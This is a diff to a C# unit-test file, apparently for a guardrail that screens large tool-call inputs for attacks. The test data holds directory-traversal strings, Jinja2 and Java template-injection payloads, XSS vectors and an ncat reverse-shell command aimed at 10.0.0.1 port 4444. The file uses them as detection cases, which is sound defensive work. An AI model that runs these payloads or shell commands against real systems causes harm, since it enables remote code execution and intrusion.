@@ -27,7 +27,13 @@ public class ToolCallGuardrailRuleLargeInputTests
         { Repeat("..;", 60_000), "/../../secret", "Directory traversal (../)" },
         { Repeat("%25", 60_000), "%2e%2e%2fsecret", "Encoded directory traversal" },
         { Repeat("{{self ", 30_000), "{{ config.items() }}", "Jinja2/Python template injection" },
+        { Repeat("{{a ", 50_000), "{{ config.items() }}", "Jinja2/Python template injection" },
+        { Repeat("{{", 100_000), " {{ self.__init__ }}", "Jinja2/Python template injection" },
+        { Repeat("${a ", 50_000), "${T(java.lang.Runtime).getRuntime()}", "Server-side template injection" },
+        { Repeat("#{", 100_000), " #{7*7}", "Expression language injection" },
         { Repeat("<script ", 30_000), "<script>alert(1)</script>", "Script tag XSS" },
+        { Repeat("<svg ", 40_000), "<svg x onfocusin=alert(1)>", "SVG XSS" },
+        { Repeat("ncat ", 40_000), "ncat 10.0.0.1 4444 -e /bin/sh", "Reverse shell patterns" },
     };
 
     [Theory]
